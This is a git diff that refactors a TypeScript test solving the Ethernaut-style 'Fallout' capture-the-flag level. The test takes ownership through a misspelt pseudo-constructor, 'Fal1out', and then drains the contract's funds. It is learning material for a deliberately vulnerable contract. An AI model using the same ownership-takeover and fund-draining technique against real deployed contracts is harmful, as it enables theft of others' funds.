@@ -1,27 +1,34 @@
 import { expect } from "chai";
 import { Contract, ContractTransaction, Signer } from "ethers";
-import { setupTest } from "./utils";
+import { TestOptions, setupChallenge, submitLevel } from "./utils";
+import { FALLOUT_LEVEL_ADDRESS } from "./constants";
 
-let eoa: Signer;
-let challenge: Contract; // challenge contract
+describe("Fallout", () => {
+  let eoa: Signer;
+  let challenge: Contract;
 
-// Setup challenge level instance, eoa, attacker and before/after hooks
-(async () => {
-  const contractLevel = "0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639";
-  const contractName = "Fallout";
-  ({ eoa, challenge } = await setupTest(contractLevel, { contractName }));
-})();
+  before(async () => {
+    const contractLevel = FALLOUT_LEVEL_ADDRESS;
+    const contractName = "Fallout";
+    const options: TestOptions = { contractName };
+    ({ eoa, challenge } = await setupChallenge(contractLevel, options));
+  });
 
-it("solves the challenge", async () => {
-  // the constructor is misspelt 'Fal1out' allowing anyone to call it and claim ownership
-  const tx: ContractTransaction = await challenge.Fal1out();
-  await tx.wait();
-  // verify we are the owner of contract
-  const [owner, eoaAddress] = await Promise.all([
-    challenge.owner(),
-    eoa.getAddress(),
-  ]);
-  expect(owner).to.equal(eoaAddress);
-  // collect monies
-  await challenge.collectAllocations();
+  it("solves the challenge", async () => {
+    // the constructor is misspelt 'Fal1out' allowing anyone to call it and claim ownership
+    const tx: ContractTransaction = await challenge.Fal1out();
+    await tx.wait();
+    // verify we are the owner of contract
+    const [owner, eoaAddress] = await Promise.all([
+      challenge.owner(),
+      eoa.getAddress(),
+    ]);
+    expect(owner).to.equal(eoaAddress);
+    // collect monies
+    await challenge.collectAllocations();
+  });
+
+  after(async () => {
+    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
+  });
 });
